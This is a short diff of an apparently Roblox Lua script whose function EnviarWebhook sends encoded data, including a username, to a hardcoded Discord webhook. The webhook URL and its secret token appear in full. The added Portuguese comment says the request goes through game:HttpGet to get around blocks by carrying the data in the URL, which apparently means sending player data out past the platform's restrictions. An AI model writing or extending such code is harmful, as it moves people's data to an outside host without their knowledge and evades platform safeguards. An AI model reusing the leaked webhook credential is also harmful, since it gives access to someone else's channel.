@@ -42,6 +42,7 @@ local function EnviarWebhook(nomeUsuario)
     local payload = HttpService:JSONEncode(data)
     local webhookUrl = "https://discord.com/api/webhooks/1374873642080665713/tCSXgbLpOjNTZxBnJjxQXeW1dmqEC5s0Nkl5WoK6_E7d36Thlp-HUrjjAh0efU1tfx84"
 
+    -- Usando game:HttpGet para burlar bloqueios com dados na URL
     local encoded = HttpService:UrlEncode(payload)
     local sendUrl = webhookUrl .. "?payload=" .. encoded
     pcall(function()
